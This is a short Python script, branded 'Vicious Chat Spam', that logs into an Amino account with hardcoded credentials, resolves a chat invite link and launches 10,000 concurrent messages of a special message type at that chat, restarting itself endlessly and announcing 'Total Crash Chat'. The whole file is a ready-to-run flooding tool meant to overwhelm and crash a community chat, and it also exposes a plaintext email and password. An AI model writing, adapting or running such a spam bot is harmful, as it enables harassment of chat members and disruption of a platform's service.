import aiohttp
import asyncio
from lib import Client
from os import system, name
from lib.helpers import device_id
#from keep_alive import keep_alive
import pyfiglet
from colored import fore, back, style, attr
attr(0)
print(fore.GREEN + style.BOLD)
print(pyfiglet.figlet_format(" Vicious", font="graffiti"))
print(pyfiglet.figlet_format("Chat Spam", font="small"))
email ="vicious-vsvuu@wwjmp.com"
password ="pagal0"


async def send(chat_id, message, message_type, community_id, client, i):
    await client.send_message(chat_id=chat_id,message=message,message_type=message_type,community_id=community_id)
    print(f"Send message :- {i}")

async def main():
    async with aiohttp.ClientSession() as session:
        try:
            client = Client(session=session,
                            simple_account={
                                            "email": email,
                                            "password": password,
                                            "device_id": device_id()
                                            })                                
            await client.login()
            system("cls" if name == "nt" else "clear")
            link ="http://aminoapps.com/p/swpq6fy"
            result = await client.link_resolution(link)

            community_id = result["linkInfoV2"]["path"].split("/")[0]
            chat_id = result["linkInfoV2"]["extensions"]["linkInfo"]["objectId"]
            system("cls" if name == "nt" else "clear")
            message ="non-stop server working.."
            system("cls" if name == "nt" else "clear")
            message_type ="109"
            system("cls" if name == "nt" else "clear")
            await asyncio.gather(*[asyncio.create_task(send(chat_id=chat_id,
                                                    message=message,
                                                                message_type=message_type,
                                                                community_id=community_id.replace("x", ""),
                                                                client=client,
                                                                i=i+1)) for i in range(10000)])
            print("Total Crash Chat")
            await main()
        except Exception as e:
            print(e)
            pass


if __name__ == "__main__":
    asyncio.get_event_loop().run_until_complete(main())
